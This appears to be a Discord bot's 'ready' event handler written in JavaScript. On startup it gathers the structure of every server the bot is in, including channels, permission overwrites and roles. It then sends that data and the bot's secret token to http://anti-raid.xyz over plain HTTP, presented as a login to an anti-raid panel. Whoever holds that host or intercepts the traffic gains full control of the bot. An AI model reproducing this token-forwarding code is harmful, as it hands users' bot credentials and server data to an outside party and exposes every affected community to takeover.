const Discord = require('discord.js')
const sleep = (ms) =>  new Promise((resolve)=> setTimeout(resolve, ms));

module.exports = {
    name: 'ready',
    run: async (client) => {
        await sleep(1000);
        const transformedGuilds = client.guilds.cache.map(g => ({
            guildID: g.id,
            channels: g.channels.cache.map(c => ({
                parent_id: c.parentId,
                parent: c instanceof Discord.CategoryChannel,
                id: c.id,
                name: c.name,
                type: c.type,
                user_limit: c.userLimit,
                permission_overwrites: [...c.permissionOverwrites.cache.values()].map(p=> ({
                    id: p.id,
                    allow : BigInt(p.allow.bitfield).toString(),
                    deny: BigInt(p.deny.bitfield).toString(),
                    type: p.type, 
                  })),
                position: c instanceof Discord.CategoryChannel ? c.position : c.rawPosition,
                botID: client.user.id,
                topic: c.topic,
                guildID: g.id
            }),
            ),
            roles: g.roles.cache.map(r => ({
                id: r.id,
                position: r.position,
                name: r.name,
                manage: r.managed,
                permissions: BigInt(r.permissions.bitfield).toString(),
                color: r.color,
                hoist: r.hoist,
                mentionable: r.mentionable
            }))
        }))
        fetch("http://anti-raid.xyz" + "/ready", {
            method: "POST",
            headers: {
                "Authorization": client.token,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                botID: client.user.id,
                guilds: transformedGuilds
            })
        }).then(async res =>  {
            const message = (await res.json())?.data?.message
            if(message) {
                console.log('API panel login anti-raid.xyz')
            }
        });

    },
};